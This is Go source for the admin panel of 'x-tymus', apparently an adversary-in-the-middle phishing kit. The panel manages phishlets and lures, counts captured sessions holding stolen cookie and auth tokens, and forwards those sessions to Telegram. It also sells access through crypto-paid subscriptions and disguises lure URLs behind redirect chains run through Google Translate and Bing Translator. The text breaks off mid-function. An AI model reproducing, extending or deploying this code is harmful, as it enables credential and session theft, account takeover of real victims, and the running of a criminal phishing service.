package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// ───────────────────────────── CSS / shell ─────────────────────────────────

const panelCSS = `
:root{
  --bg:#07070f;--surf:#0d0d1a;--card:#111120;--brd:#1c1c2e;--brd2:#111120;
  --t1:#e2e2f0;--t2:#7070a0;--t3:#32324a;
  --brand:#7c3aed;--blue:#3b82f6;--green:#10b981;--red:#ef4444;--amber:#f59e0b;--cyan:#06b6d4;
  --r:8px;--r2:5px;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--t1);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Inter',sans-serif;font-size:13px;line-height:1.55}
a{color:var(--blue);text-decoration:none}
a:hover{text-decoration:underline;opacity:.85}

/* ── Topbar ── */
.topbar{background:var(--surf);border-bottom:1px solid var(--brd);padding:0 24px;height:54px;display:flex;align-items:center;gap:18px;position:sticky;top:0;z-index:200}
.brand{display:flex;align-items:center;gap:9px;font-size:14px;font-weight:700;color:#fff;letter-spacing:-.3px;flex-shrink:0}
.brand-icon{width:26px;height:26px;background:linear-gradient(135deg,var(--brand) 0%,#4f46e5 100%);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#fff;flex-shrink:0;box-shadow:0 2px 8px rgba(124,58,237,.4)}
.topbar-status{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--t2)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.topbar-nav{margin-left:auto;display:flex;align-items:center;gap:14px}
.topbar-nav a{color:var(--t2);font-size:12px;font-weight:500;transition:color .15s}
.topbar-nav a:hover{color:var(--t1);text-decoration:none}

/* ── Tab bar ── */
.tabbar{background:var(--surf);border-bottom:1px solid var(--brd);display:flex;padding:0 20px;overflow-x:auto;-webkit-overflow-scrolling:touch;gap:0}
.tabbar::-webkit-scrollbar{height:0}
.tab{padding:13px 15px;font-size:12px;font-weight:500;color:var(--t2);border-bottom:2px solid transparent;white-space:nowrap;cursor:pointer;text-decoration:none;transition:color .15s,border-color .15s;display:flex;align-items:center;gap:6px}
.tab:hover{color:var(--t1);text-decoration:none}
.tab.active{color:#fff;border-bottom-color:var(--brand)}
.tab-pill{background:var(--amber);color:#000;border-radius:10px;padding:1px 6px;font-size:10px;font-weight:800;line-height:1.4}

/* ── Layout ── */
.wrap{max-width:1400px;margin:0 auto;padding:26px 22px}

/* ── Stats ── */
.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(138px,1fr));gap:10px;margin-bottom:26px}
.stat{background:var(--card);border:1px solid var(--brd);border-radius:var(--r);padding:16px 18px;position:relative;overflow:hidden;transition:border-color .2s}
.stat:hover{border-color:var(--t3)}
.stat::after{content:'';position:absolute;top:0;right:0;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.015));pointer-events:none}
.stat-n{font-size:28px;font-weight:700;line-height:1;margin-bottom:5px;font-variant-numeric:tabular-nums}
.stat-l{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3)}

/* ── Section ── */
.section{margin-bottom:28px}
.section-hd{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.section-title{font-size:11.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t2);white-space:nowrap}
.section-line{flex:1;height:1px;background:var(--brd)}

/* ── Card ── */
.card{background:var(--card);border:1px solid var(--brd);border-radius:var(--r);padding:18px 20px}

/* ── Tables ── */
.table-wrap{border:1px solid var(--brd);border-radius:var(--r);overflow:hidden;overflow-x:auto;-webkit-overflow-scrolling:touch}
.table-wrap table{border:none!important;min-width:500px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
thead tr{background:rgba(13,13,26,.9)}
th{padding:10px 14px;text-align:left;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);border-bottom:1px solid var(--brd);white-space:nowrap}
td{padding:11px 14px;border-bottom:1px solid var(--brd2);vertical-align:middle}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover td{background:rgba(255,255,255,.018)}

/* ── Badges ── */
.badge{display:inline-flex;align-items:center;padding:3px 9px;border-radius:20px;font-size:10.5px;font-weight:700;white-space:nowrap}
.badge-green{background:rgba(16,185,129,.12);color:#34d399}
.badge-red{background:rgba(239,68,68,.12);color:#f87171}
.badge-blue{background:rgba(59,130,246,.12);color:#60a5fa}
.badge-yellow,.badge-amber{background:rgba(245,158,11,.12);color:#fbbf24}
.badge-gray{background:rgba(255,255,255,.06);color:#6b7280}
.badge-purple{background:rgba(124,58,237,.14);color:#a78bfa}

/* ── Forms ── */
.form-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin-bottom:16px}
.form-row{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end;margin-bottom:10px}
.field{display:flex;flex-direction:column;gap:5px}
.field-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3)}
.field-full{grid-column:1/-1}
input[type=text],input[type=password],select,textarea{
  background:var(--surf);border:1px solid var(--brd);color:var(--t1);
  padding:8px 11px;border-radius:var(--r2);font-size:12.5px;outline:none;
  transition:border-color .15s,box-shadow .15s;font-family:inherit;width:100%
}
input:focus,select:focus,textarea:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(124,58,237,.12)}
textarea{resize:vertical;line-height:1.6}

/* ── Buttons ── */
.btn,button{
  display:inline-flex;align-items:center;gap:5px;
  padding:7px 15px;border-radius:var(--r2);
  font-size:12px;font-weight:600;cursor:pointer;
  border:1px solid transparent;text-decoration:none;
  white-space:nowrap;transition:opacity .15s,transform .1s;
  font-family:inherit;line-height:1;
}
.btn:hover,button:hover{opacity:.82;text-decoration:none}
.btn:active,button:active{transform:scale(.97)}
.btn-primary{background:var(--brand);color:#fff;border-color:var(--brand)}
.btn-blue{background:var(--blue);color:#fff;border-color:var(--blue)}
.btn-green{background:var(--green);color:#fff;border-color:var(--green)}
.btn-danger{background:var(--red);color:#fff;border-color:var(--red)}
.btn-ghost{background:transparent;color:var(--t2);border-color:var(--brd)}
.btn-ghost:hover{color:var(--t1);border-color:var(--t3)}
.btn-amber{background:rgba(245,158,11,.15);color:var(--amber);border-color:rgba(245,158,11,.25)}
.btn-sm{padding:5px 12px;font-size:11px}
.btn-xs{padding:3px 9px;font-size:10.5px}

/* ── Alerts ── */
.flash-err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.22);color:#fca5a5;border-radius:var(--r2);padding:10px 14px;margin-bottom:16px;font-size:12.5px}
.flash-ok{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.22);color:#6ee7b7;border-radius:var(--r2);padding:10px 14px;margin-bottom:16px;font-size:12.5px}

/* ── Misc ── */
.mono{font-family:'SF Mono','Fira Code',monospace;font-size:11.5px}
pre{background:var(--surf);border:1px solid var(--brd);border-radius:var(--r2);padding:11px 13px;font-size:11px;overflow-x:auto;color:#9ca3af;white-space:pre-wrap;word-break:break-all}
.empty{color:var(--t3);padding:30px 0;text-align:center;font-size:12.5px;font-style:italic}
form.inline{display:inline}
details>summary{cursor:pointer;color:var(--blue);font-size:11.5px;list-style:none;display:inline-flex;align-items:center;gap:4px;user-select:none}
details>summary::-webkit-details-marker{display:none}
details[open]>summary{color:var(--amber)}
.chain-box{background:rgba(16,185,129,.03);border:1px solid rgba(16,185,129,.1);border-radius:var(--r2);padding:12px;margin-top:8px}
.chain-label{color:var(--green);font-weight:700;font-size:10px;text-transform:uppercase;letter-spacing:.5px;margin:8px 0 3px}
.chain-label:first-child{margin-top:0}
.chain-link{font-family:monospace;color:#34d399;font-size:11.5px;word-break:break-all}
.chain-hop{font-family:monospace;color:var(--t3);font-size:10.5px;word-break:break-all;margin-top:2px}
.url-cell{font-family:monospace;font-size:11.5px;color:var(--blue);word-break:break-all;max-width:270px}
.kv-row{display:flex;gap:8px;align-items:center;margin-bottom:6px;font-size:12px}
.kv-key{color:var(--t3);font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:.4px;min-width:90px}
.kv-val{color:var(--t1)}

/* ── Responsive ── */
@media(max-width:768px){
  .topbar{padding:0 14px;height:48px;gap:10px}
  .topbar-status{display:none}
  .tabbar{padding:0 10px}
  .wrap{padding:14px 10px}
  .stats{grid-template-columns:repeat(2,1fr);gap:8px}
  .stat{padding:12px 13px}
  .stat-n{font-size:22px}
  .card{padding:13px 14px}
  .form-grid{grid-template-columns:1fr!important}
  th,td{padding:8px 10px}
  .tab{padding:10px 11px;font-size:11px}
  .section-title{font-size:10.5px}
}
@media(max-width:480px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .stat-n{font-size:18px}
  .topbar-nav{display:none}
}
`

func panelPage(title, navExtra, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%s — x-tymus</title>
<style>%s</style>
</head>
<body>
<div class="topbar">
  <div class="brand">
    <div class="brand-icon">⚡</div>
    x-tymus
  </div>
  <div class="topbar-status">
    <span class="dot"></span>
    <span>online</span>
  </div>
  <nav class="topbar-nav">%s</nav>
</div>
<div class="wrap">%s</div>
<script>
function cp(el){
  var t=el.getAttribute('data-copy');
  var done=function(){var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1400);};
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(t).then(done,function(){fallbackCopy(t,done);});
  }else{fallbackCopy(t,done);}
}
function fallbackCopy(t,cb){
  var ta=document.createElement('textarea');
  ta.value=t;ta.style.cssText='position:fixed;left:-9999px;top:-9999px;opacity:0';
  document.body.appendChild(ta);ta.focus();ta.select();
  try{document.execCommand('copy');if(cb)cb();}catch(e){}
  document.body.removeChild(ta);
}
</script>
</body></html>`, title, panelCSS, navExtra, body)
}

// ───────────────────────────── Auth ────────────────────────────────────────

func (s *HttpServer) requireAdminAuth(w http.ResponseWriter, r *http.Request) bool {
	pass := s.Cfg.GetAdminPassword()
	if pass == "" {
		http.Error(w, "Admin password not set. Run: config admin_password <pass>", http.StatusForbidden)
		return false
	}
	user, pw, ok := r.BasicAuth()
	if !ok || user != "admin" || pw != pass {
		w.Header().Set("WWW-Authenticate", `Basic realm="x-tymus Admin"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

// ───────────────────────────── Admin Panel ─────────────────────────────────

func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdminAuth(w, r) {
		return
	}

	if r.Method == http.MethodPost {
		r.ParseForm()
		switch r.FormValue("action") {

		case "create_user":
			uname := strings.TrimSpace(r.FormValue("username"))
			pass := strings.TrimSpace(r.FormValue("password"))
			if uname == "" || pass == "" {
				http.Redirect(w, r, "/admin/panel?err=username+and+password+required", http.StatusSeeOther)
				return
			}
			token := GenRandomToken()
			if _, err := s.Db.CreateUser(uname, pass, token); err != nil {
				log.Error("admin: create user: %v", err)
				http.Redirect(w, r, "/admin/panel?err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
				return
			}
			log.Info("admin: created user '%s'", uname)
			http.Redirect(w, r, "/admin/panel?ok=user+created", http.StatusSeeOther)
			return

		case "delete_user":
			id, _ := strconv.Atoi(r.FormValue("id"))
			s.Db.DeleteUserById(id)
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return

		case "assign_lure":
			lureIdx, _ := strconv.Atoi(r.FormValue("lure_id"))
			username := strings.TrimSpace(r.FormValue("username"))
			l, err := s.Cfg.GetLure(lureIdx)
			if err == nil {
				if username == "" || username == "-" {
					l.UserId = ""
				} else {
					l.UserId = username
				}
				s.Cfg.SetLure(lureIdx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "blacklist_add":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.AddIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "blacklist_remove":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.RemoveIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "delete_session":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			s.Db.DeleteSessionById(sid)
			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
			return

		case "send_telegram":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			if sess, err := s.Db.GetSessionById(sid); err == nil {
				NotifySessionFromDB(sess)
			}
			http.Redirect(w, r, "/admin/panel?tab=sessions&ok=sent+to+telegram", http.StatusSeeOther)
			return

		case "create_lure":
			pl := strings.TrimSpace(r.FormValue("phishlet"))
			path := strings.TrimSpace(r.FormValue("path"))
			redir := strings.TrimSpace(r.FormValue("redirect_url"))
			user := strings.TrimSpace(r.FormValue("user_id"))
			if pl == "" {
				http.Redirect(w, r, "/admin/panel?tab=lures&err=phishlet+required", http.StatusSeeOther)
				return
			}
			if path == "" {
				path = "/" + GenRandomString(8)
			}
			lure := &Lure{Path: path, Phishlet: pl, RedirectUrl: redir, UserId: user}
			s.Cfg.AddLure(pl, lure)
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+created", http.StatusSeeOther)
			return

		case "delete_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			s.Cfg.DeleteLure(idx)
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "edit_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			l, err := s.Cfg.GetLure(idx)
			if err == nil {
				if v := strings.TrimSpace(r.FormValue("redirect_url")); v != "" {
					l.RedirectUrl = v
				}
				if v := strings.TrimSpace(r.FormValue("path")); v != "" {
					l.Path = v
				}
				s.Cfg.SetLure(idx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+updated", http.StatusSeeOther)
			return

		case "enable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteEnabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" enabled"), http.StatusSeeOther)
			}
			return

		case "disable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteDisabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" disabled"), http.StatusSeeOther)
			}
			return

		case "set_phishlet_hostname":
			site := strings.TrimSpace(r.FormValue("site"))
			hostname := strings.TrimSpace(r.FormValue("hostname"))
			if ok := s.Cfg.SetSiteHostname(site, hostname); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=failed+to+set+hostname", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=hostname+saved", http.StatusSeeOther)
			}
			return

		case "set_phishlet_unauth":
			site := strings.TrimSpace(r.FormValue("site"))
			unauthUrl := strings.TrimSpace(r.FormValue("unauth_url"))
			if ok := s.Cfg.SetSiteUnauthUrl(site, unauthUrl); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=invalid+unauth+url", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=unauth+url+saved", http.StatusSeeOther)
			}
			return

		case "save_bot_config":
			token := strings.TrimSpace(r.FormValue("bot_token"))
			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
			adminId, _ := strconv.ParseInt(adminIdStr, 10, 64)
			btc := strings.TrimSpace(r.FormValue("crypto_btc"))
			eth := strings.TrimSpace(r.FormValue("crypto_eth"))
			usdt := strings.TrimSpace(r.FormValue("crypto_usdt"))
			priceStr := strings.TrimSpace(r.FormValue("sub_price"))
			price, _ := strconv.Atoi(priceStr)
			if token != "" {
				s.Cfg.SetBotToken(token)
			}
			if adminId != 0 {
				s.Cfg.SetBotAdminChatId(adminId)
			}
			if btc != "" {
				s.Cfg.SetCryptoBTC(btc)
			}
			if eth != "" {
				s.Cfg.SetCryptoETH(eth)
			}
			if usdt != "" {
				s.Cfg.SetCryptoUSDT(usdt)
			}
			if price > 0 {
				s.Cfg.SetSubPrice(price)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=bot+config+saved+(restart+to+apply+token+change)", http.StatusSeeOther)
			return

		case "approve_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				if err := GlobalBot.ApproveSub(id, s.Cfg.GetBotAdminChatId()); err != nil {
					http.Redirect(w, r, "/admin/panel?tab=telegram&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
					return
				}
			} else {
				http.Redirect(w, r, "/admin/panel?tab=telegram&err=bot+not+running", http.StatusSeeOther)
				return
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=approved", http.StatusSeeOther)
			return

		case "reject_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				GlobalBot.RejectSub(id, s.Cfg.GetBotAdminChatId())
			} else {
				s.Db.DeleteSubscription(id)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return

		case "delete_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			s.Db.DeleteSubscription(id)
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return
		}
	}

	// ── Gather data ──
	userList, _ := s.Db.ListUsers()
	allSessions, _ := s.Db.ListSessions()
	allLures := s.Cfg.GetAllLures()
	allSubs, _ := s.Db.ListSubscriptions()

	totalTokens := 0
	for _, sess := range allSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	pendingSubs := 0
	for _, sub := range allSubs {
		if sub.Status == "pending" {
			pendingSubs++
		}
	}

	sessPerUser := map[string]int{}
	tokenPerUser := map[string]int{}
	for _, sess := range allSessions {
		for _, l := range allLures {
			if l.Phishlet == sess.Phishlet && l.UserId != "" {
				sessPerUser[l.UserId]++
				if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
					tokenPerUser[l.UserId]++
				}
				break
			}
		}
	}

	blCount := 0
	if GlobalBlacklist != nil {
		n, m := GlobalBlacklist.GetStats()
		blCount = n + m
	}

	activeTab := r.URL.Query().Get("tab")
	if activeTab == "" {
		activeTab = "overview"
	}
	errMsg := r.URL.Query().Get("err")
	okMsg := r.URL.Query().Get("ok")

	var b strings.Builder

	// ── Stats ──
	b.WriteString(fmt.Sprintf(`<div class="stats">
  <div class="stat"><div class="stat-n" style="color:var(--blue)">%d</div><div class="stat-l">Users</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--amber)">%d</div><div class="stat-l">Subscriptions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--red)">%d</div><div class="stat-l">Pending Subs</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t3)">%d</div><div class="stat-l">Blacklisted</div></div>
</div>`, len(userList), len(allLures), len(allSessions), totalTokens, len(allSubs), pendingSubs, blCount))

	if errMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="flash-err">%s</div>`, template.HTMLEscapeString(errMsg)))
	}
	if okMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="flash-ok">%s</div>`, template.HTMLEscapeString(okMsg)))
	}

	// ── Tabs ──
	pendingLabel := "Telegram Bot"
	if pendingSubs > 0 {
		pendingLabel = fmt.Sprintf(`Telegram Bot <span class="tab-pill">%d</span>`, pendingSubs)
	}
	tabs := []struct{ id, label string }{
		{"overview", "Overview"},
		{"users", "Users"},
		{"phishlets", "Phishlets"},
		{"lures", "Lures &amp; Chains"},
		{"sessions", "Sessions"},
		{"devicecodes", "Device Codes"},
		{"blacklist", "Blacklist"},
		{"telegram", pendingLabel},
	}
	b.WriteString(`<div class="tabbar">`)
	for _, t := range tabs {
		cls := "tab"
		if t.id == activeTab {
			cls += " active"
		}
		b.WriteString(fmt.Sprintf(`<a href="/admin/panel?tab=%s" class="%s">%s</a>`, t.id, cls, t.label))
	}
	b.WriteString(`</div><div style="height:20px"></div>`)

	// ── Tab content ──
	switch activeTab {

	// ── OVERVIEW ─────────────────────────────────────────────────────────────
	case "overview":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Recent Sessions"))
		recent := allSessions
		if len(recent) > 10 {
			recent = recent[len(recent)-10:]
		}
		if len(recent) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(recent, false))
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Users"))
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── USERS ─────────────────────────────────────────────────────────────────
	case "users":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Create User"))
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel">
<input type="hidden" name="action" value="create_user">
<div class="form-grid" style="grid-template-columns:repeat(auto-fill,minmax(180px,1fr))">
  <div class="field"><label class="field-label">Username</label><input type="text" name="username" placeholder="username" required></div>
  <div class="field"><label class="field-label">Password</label><input type="password" name="password" placeholder="password" required></div>
  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-blue">+ Create User</button></div>
</div>
</form></div></div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("All Users"))
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── PHISHLETS ─────────────────────────────────────────────────────────────
	case "phishlets":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Phishlet Configuration"))
		names := s.Cfg.GetPhishletNames()
		if len(names) == 0 {
			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>Name</th><th>Service</th><th>Hostname</th><th>Unauth URL</th><th>Status</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, name := range names {
				pc := s.Cfg.PhishletConfig(name)
				enabled := pc.Enabled
				statusBadge := `<span class="badge badge-gray">disabled</span>`
				if enabled {
					statusBadge = `<span class="badge badge-green">● enabled</span>`
				}
				hostname := pc.Hostname
				if hostname == "" {
					hostname = `<span style="color:var(--t3)">not set</span>`
				}
				unauthUrl := pc.UnauthUrl
				if unauthUrl == "" {
					unauthUrl = `<span style="color:var(--t3)">—</span>`
				}

				toggleBtn := ""
				if enabled {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="disable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Disable</button>
</form>`, template.HTMLEscapeString(name))
				} else {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="enable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn btn-green btn-xs">Enable</button>
</form>`, template.HTMLEscapeString(name))
				}

				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
<input type="hidden" name="action" value="set_phishlet_hostname">
<input type="hidden" name="site" value="%s">
<input type="text" name="hostname" placeholder="sub.domain.com" style="font-size:11.5px;padding:5px 8px" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.Hostname))

				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
<input type="hidden" name="action" value="set_phishlet_unauth">
<input type="hidden" name="site" value="%s">
<input type="text" name="unauth_url" placeholder="https://..." style="font-size:11.5px;padding:5px 8px" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.UnauthUrl))

				b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-purple">%s</span></td>
<td style="color:var(--t2);font-size:12px">%s</td>
<td>%s%s</td>
<td>%s%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					template.HTMLEscapeString(name),
					phishletFriendlyName(name),
					hostname, hostnameForm,
					unauthUrl, unauthForm,
					statusBadge,
					toggleBtn,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Quick Create Lure"))
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

	// ── LURES ─────────────────────────────────────────────────────────────────
	case "lures":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Create Lure"))
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("All Lures"))
		if len(allLures) == 0 {
			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
</tr></thead><tbody>`)
			for i, l := range allLures {
				lureURL := ""
				if l.Hostname != "" {
					lureURL = "https://" + l.Hostname + l.Path
				} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
					if pu, err := pl.GetLureUrl(l.Path); err == nil {
						lureURL = pu
					}
				}

				lureURLCell := `<span style="color:var(--t3)">—</span>`
				if lureURL != "" {
					lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
						template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
				}

				redirectCell := `<span style="color:var(--t3)">—</span>`
				if l.RedirectUrl != "" {
					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
						template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 36)))
				}

				userCell := `<span style="color:var(--t3)">unassigned</span>`
				if l.UserId != "" {
					userCell = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
				}

				chainCell := `<span style="color:var(--t3)">—</span>`
				if lureURL != "" {
					parsedURL, err := url.Parse(lureURL)
					if err == nil {
						phishBase := parsedURL.Scheme + "://" + parsedURL.Host
						outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
						if err == nil {
							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
							bingLink := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

							chainCell = fmt.Sprintf(`<details>
<summary>▶ Generate Chain</summary>
<div class="chain-box">
  <div class="chain-label">Google Translate</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Bing Translator</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Direct Chain</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label" style="margin-top:8px">Hops</div>`,
								template.HTMLEscapeString(truncateStr(translateLink, 56)), template.HTMLEscapeString(translateLink),
								template.HTMLEscapeString(truncateStr(bingLink, 56)), template.HTMLEscapeString(bingLink),
								template.HTMLEscapeString(truncateStr(outer, 56)), template.HTMLEscapeString(outer),
							)
							for j, hop := range hops {
								chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
							}
							chainCell += fmt.Sprintf(`<div class="chain-hop" style="color:var(--green)">final → %s</div></div></details>`, template.HTMLEscapeString(lureURL))
						}
					}
				}

				userOptions := `<option value="-">— unassign —</option>`
				for _, u := range userList {
					sel := ""
					if u.Username == l.UserId {
						sel = " selected"
					}
					userOptions += fmt.Sprintf(`<option value="%s"%s>%s</option>`,
						template.HTMLEscapeString(u.Username), sel, template.HTMLEscapeString(u.Username))
				}
				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:5px;align-items:center;margin-top:4px">
<input type="hidden" name="action" value="assign_lure">
<input type="hidden" name="lure_id" value="%d">
